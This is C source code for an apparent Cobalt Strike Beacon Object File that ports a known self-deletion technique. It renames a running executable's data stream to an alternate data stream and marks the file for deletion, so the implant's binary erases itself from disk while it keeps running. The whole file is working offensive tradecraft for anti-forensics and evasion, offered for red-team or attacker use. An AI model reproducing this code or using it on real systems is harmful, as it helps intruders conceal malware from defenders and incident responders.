#ifndef _WIN64
#error This code must be compiled with a 64-bit version of MSVC
#endif

#include <windows.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include "headers/syscalls.h"
#include "headers/beacon.h"
#include "headers/win32_api.h"


#define NEW_ADS L":newads"


VOID vanityBanner(void) {
    LPCWSTR banner = L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                     L"|      Self-Deletion BOF Port       |\n"
                     L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                     L"|       By: @the_bit_diddler        |\n"
                     L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                     L"|   Credits: @jonasLyk @LloydLabs   |\n"
                     L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n";
    
    BeaconPrintf(CALLBACK_OUTPUT, "%ls\n", (wchar_t*)banner);
}


BOOL renameDataStream(HANDLE hHandle) 
{
    FILE_RENAME_INFO friRename;
    MSVCRT$memset(&friRename, 0, sizeof(friRename));

    LPWSTR lpwStream = NEW_ADS;
    friRename.FileNameLength = sizeof(lpwStream);

    MSVCRT$memcpy(friRename.FileName, lpwStream, sizeof(lpwStream));

    return KERNEL32$SetFileInformationByHandle(hHandle, FileRenameInfo, &friRename, sizeof(friRename) + sizeof(lpwStream));
}


BOOL setDeletionAttribute(HANDLE hHandle) 
{
    FILE_DISPOSITION_INFO fDelete;
    MSVCRT$memset(&fDelete, 0, sizeof(fDelete));

    fDelete.DeleteFile = TRUE;

    return KERNEL32$SetFileInformationByHandle(hHandle, FileDispositionInfo, &fDelete, sizeof(fDelete));
}


int go(char *args, int len) 
{
    datap parser;

    BeaconDataParse(&parser, args, len);

    vanityBanner();

    WCHAR wcPath[MAX_PATH + 1];
    MSVCRT$memset(wcPath, 0, sizeof(wcPath));

    if ( KERNEL32$GetModuleFileNameW(NULL, wcPath, MAX_PATH) == 0 ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get current module handle.\n");
        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Obtained a handle to current module file handle.\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Current file path: %ls\n", (wchar_t*)wcPath);
    }

    HANDLE hCurrent = KERNEL32$CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if ( hCurrent == INVALID_HANDLE_VALUE ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get handle to current file.\n");
        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Got handle to file.\n");
    }

    BOOL returnedHandleRename = renameDataStream(hCurrent);
    if ( !returnedHandleRename ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to rename data stream from handle.\n");
        NtClose(hCurrent);
        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Renamed handle to %ls's data stream successfully.\n", (wchar_t*)wcPath);
        NtClose(hCurrent);
    }

    hCurrent = KERNEL32$CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if ( hCurrent == INVALID_HANDLE_VALUE ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get second handle to current file.\n");
        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Got second handle to file for further manipulation.\n");
    }
    
    if ( !setDeletionAttribute(hCurrent) ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set desired deposition. Destroying handle and returning.\n");
        NtClose(hCurrent);

        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Deletion attribute set successfully! Destroying handle to trigger self-deletion.\n");
        NtClose(hCurrent);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "We should have successfully deleted the file: %ls\n", (wchar_t*)wcPath);

    return 1;
}